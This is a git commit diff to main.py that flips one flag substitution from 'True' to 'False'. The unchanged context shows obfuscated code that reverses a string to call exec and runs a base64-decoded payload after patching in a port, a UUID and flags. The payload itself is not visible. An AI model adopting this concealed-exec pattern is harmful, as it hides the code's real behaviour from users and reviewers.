2df0fc97a7b223001527721105dc093d276f51f1
mjkhu7 <164321968+mjkhu7@users.noreply.github.com>
2024-03-21 02:18:08 -0800

    Update main.py

--- main.py
+++ main.py
@@ -4,7 +4,7 @@ from base64 import b64decode as de
 if __name__ == "__main__":
     getattr(__builtins__, "cexe"[::-1])(
         de(key).decode("utf8").replace(str(int("0x1f90", 16)), str(8080))
-        .replace("fc_", "True")
+        .replace("fc_", "False")
         .replace("iu_", "1331cadd-ff1a-436b-bd8f-b290efb661e0")
         .replace("lv_", "")
         .replace("mv_", "")
